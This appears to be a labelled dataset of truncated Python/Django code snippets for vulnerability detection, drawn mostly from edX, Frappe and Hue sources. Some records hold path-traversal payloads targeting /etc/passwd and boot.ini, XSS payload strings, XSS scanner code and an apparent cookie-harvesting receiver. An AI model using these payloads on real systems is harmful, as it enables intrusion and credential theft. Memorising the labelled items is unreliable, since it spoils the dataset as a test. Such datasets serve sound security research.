url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 15589, "code": ".flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self):", "label": 0}, {"snippet_id": 21360, "code": "<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 26744, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../.", "label": 0}, {"snippet_id": 20125, "code": "-fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo", "label": 0}, {"snippet_id": 22883, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^", "label": 1}, {"snippet_id": 14097, "code": ")/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications", "label": 0}, {"snippet_id": 29256, "code": ".put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv, cfg, **kwargs): \timport sql \ttmp_file=sql.get_setting('tmp_config_path", "label": 0}, {"snippet_id": 55105, "code": " for project in projects: if( not request.user.can_translate(project=project, locale=locale) or readonly_exists(projects, locale) ): return HttpResponseForbidden( \"Forbidden: You don't have permission for", "label": 0}, {"snippet_id": 49622, "code": ".object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of", "label": 0}, {"snippet_id": 50316, "code": " not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request", "label": 0}, {"snippet_id": 10998, "code": "(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{", "label": 0}, {"snippet_id": 42646, "code": ".fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t", "label": 0}, {"snippet_id": 4265, "code": ":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url", "label": 0}, {"snippet_id": 20024, "code": " self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases", "label": 0}, {"snippet_id": 35974, "code": "\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html", "label": 1}, {"snippet_id": 22698, "code": ".views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 48925, "code": " self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr(field, 'do_not_call_in_templates", "label": 1}, {"snippet_id": 53420, "code": "(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'", "label": 0}, {"snippet_id": 7397, "code": "(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?", "label": 0}, {"snippet_id": 3139, "code": ",value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, ", "label": 0}, {"snippet_id": 6653, "code": " /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames value=self.config.get(self.section, 'status_test_usernames", "label": 0}, {"snippet_id": 52347, "code": ".get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2", "label": 0}, {"snippet_id": 38376, "code": "\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content", "label": 0}, {"snippet_id": 10308, "code": "' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using", "label": 0}, {"snippet_id": 16317, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 12134, "code": ", 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 27755, "code": " self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _): \"\"\"Catch exception and format", "label": 0}, {"snippet_id": 34592, "code": "=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif", "label": 0}, {"snippet_id": 30938, "code": " import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template", "label": 1}, {"snippet_id": 53939, "code": " \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n", "label": 0}, {"snippet_id": 20615, "code": " urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),", "label": 0}, {"snippet_id": 8797, "code": " name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name", "label": 0}, {"snippet_id": 42898, "code": "\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch", "label": 0}, {"snippet_id": 9909, "code": ".instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')),", "label": 0}, {"snippet_id": 40369, "code": " 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password", "label": 0}, {"snippet_id": 9395, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 45210, "code": "'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json", "label": 1}, {"snippet_id": 9791, "code": "?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url", "label": 0}, {"snippet_id": 3624, "code": "'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 16104, "code": "<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url", "label": 0}, {"snippet_id": 3560, "code": " print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format", "label": 0}, {"snippet_id": 17892, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r", "label": 0}, {"snippet_id": 32753, "code": "', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents", "label": 0}, {"snippet_id": 55126, "code": "=Translation.objects.filter( active=True, locale=locale, entity__in=entities, ) action_function=ACTIONS_FN_MAP[form.cleaned_data['action']] action_status=action_function( form, request.user, active_translations", "label": 0}, {"snippet_id": 3313, "code": " ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers", "label": 0}, {"snippet_id": 14229, "code": ".ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin", "label": 0}, {"snippet_id": 42250, "code": " in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\"", "label": 0}, {"snippet_id": 44461, "code": " id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save", "label": 0}, {"snippet_id": 14419, "code": ".manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):", "label": 0}, {"snippet_id": 28872, "code": ".BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No such file or directory\": \t\t\treturn '%s. Check ssh key' % e", "label": 0}, {"snippet_id": 44331, "code": " e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json", "label": 1}, {"snippet_id": 43823, "code": "(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields", "label": 0}, {"snippet_id": 49677, "code": " start=1): kwargs={ 'model': self.model, 'column_id': index, 'query_params': self.query_params, 'ordering_query_param': self.ordering_query_param, } try: field, label=field except(TypeError, ValueError):", "label": 0}, {"snippet_id": 26952, "code": ", params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if", "label": 0}, {"snippet_id": 50667, "code": "=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=None csession.save() self.logged_in=False self.client.lineSend(self.csessid,[\"connection_close\",[reason],{}]) self.client", "label": 0}, {"snippet_id": 48647, "code": " r.ready=False r.open=True r.pickupDate=datetime.datetime.now() else: return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if", "label": 0}, {"snippet_id": 44468, "code": "' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add", "label": 0}, {"snippet_id": 51949, "code": "'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder', 'compressor.finders", "label": 0}, {"snippet_id": 3908, "code": "\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break", "label": 0}, {"snippet_id": 46092, "code": ".GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query':", "label": 1}, {"snippet_id": 40335, "code": "))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values", "label": 0}, {"snippet_id": 708, "code": " param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"", "label": 1}, {"snippet_id": 46168, "code": " collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[{'q': ''}], ", "label": 0}, {"snippet_id": 42070, "code": " None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): ", "label": 0}, {"snippet_id": 1228, "code": "=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url", "label": 0}, {"snippet_id": 38215, "code": "\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category", "label": 0}, {"snippet_id": 35249, "code": ".fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))", "label": 0}, {"snippet_id": 27556, "code": "=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool", "label": 0}, {"snippet_id": 27551, "code": "(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the", "label": 0}, {"snippet_id": 28941, "code": "\t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute", "label": 0}, {"snippet_id": 49463, "code": " return super(SmartFilter, self).get_title() def get_values(self): values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0],", "label": 0}, {"snippet_id": 23700, "code": "\"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file", "label": 0}, {"snippet_id": 8392, "code": " urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if", "label": 0}, {"snippet_id": 3363, "code": " ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=", "label": 0}, {"snippet_id": 36633, "code": ".blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content", "label": 0}, {"snippet_id": 27621, "code": ", } self.render('error-403.html', template_values, 403) def _add_security_response_headers(self): \"\"\"Add security-related headers to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max", "label": 0}, {"snippet_id": 53056, "code": " coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type=", "label": 0}, {"snippet_id": 21981, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate", "label": 0}, {"snippet_id": 28433, "code": "='%Y%m%d' \tif type==\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path", "label": 0}, {"snippet_id": 5532, "code": "=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc", "label": 0}, {"snippet_id": 5899, "code": " payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def", "label": 0}, {"snippet_id": 11010, "code": "--fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo", "label": 0}, {"snippet_id": 42484, "code": "\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t", "label": 0}, {"snippet_id": 15707, "code": " running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print", "label": 0}, {"snippet_id": 31742, "code": "/div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form", "label": 0}, {"snippet_id": 628, "code": " xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print", "label": 1}, {"snippet_id": 6793, "code": " authn_info_mongo_uri(self): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config", "label": 0}, {"snippet_id": 40092, "code": "\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length", "label": 0}, {"snippet_id": 47706, "code": " w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False", "label": 0}, {"snippet_id": 386, "code": ",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 1}, {"snippet_id": 33179, "code": " build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to API explorer", "label": 0}, {"snippet_id": 12760, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/", "label": 0}, {"snippet_id": 2268, "code": " xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query", "label": 0}, {"snippet_id": 13100, "code": ".reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'", "label": 0}, {"snippet_id": 54520, "code": " CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm): class Meta: model=Article fields=['title',", "label": 0}, {"snippet_id": 51403, "code": " see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__", "label": 0}, {"snippet_id": 54873, "code": " django.http import( HttpResponseBadRequest, HttpResponseForbidden, JsonResponse, ) from django.shortcuts import get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base", "label": 0}, {"snippet_id": 17444, "code": "(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'", "label": 0}, {"snippet_id": 33703, "code": "\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate", "label": 0}, {"snippet_id": 18976, "code": ".manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):", "label": 0}, {"snippet_id": 54193, "code": "(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row", "label": 0}, {"snippet_id": 49005, "code": ".format(type(self.object))) return format_html( '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value()) ) class SmartListItem(object): def __init__(self, smart_list", "label": 0}, {"snippet_id": 23604, "code": "=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW", "label": 0}, {"snippet_id": 1812, "code": " open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content", "label": 0}, {"snippet_id": 26547, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../../.", "label": 0}, {"snippet_id": 26343, "code": " self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT", "label": 0}, {"snippet_id": 28806, "code": ": \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name", "label": 0}, {"snippet_id": 34538, "code": "\t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) ", "label": 0}, {"snippet_id": 40430, "code": "(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname", "label": 0}, {"snippet_id": 44759, "code": "(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype", "label": 0}, {"snippet_id": 42866, "code": "))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self", "label": 0}, {"snippet_id": 4275, "code": ": if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 43777, "code": ".print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format", "label": 0}, {"snippet_id": 28676, "code": "-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies", "label": 0}, {"snippet_id": 6914, "code": " import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth", "label": 0}, {"snippet_id": 47672, "code": "(PlainText('<br />Choose a password: ')) f.add_content(PasswordField(name='password', required=False)) f.add_content(PlainText('Confirm your password: ')) f.add_content(PasswordField(name='confirm_password',", "label": 0}, {"snippet_id": 14724, "code": "{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store", "label": 0}, {"snippet_id": 6670, "code": "'status_test_usernames') res=[x.strip() for x in value.split(',')] self._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"", "label": 0}, {"snippet_id": 11569, "code": ".reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index", "label": 0}, {"snippet_id": 44537, "code": " response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id'", "label": 0}, {"snippet_id": 20451, "code": " self.course_key, \"depth\": 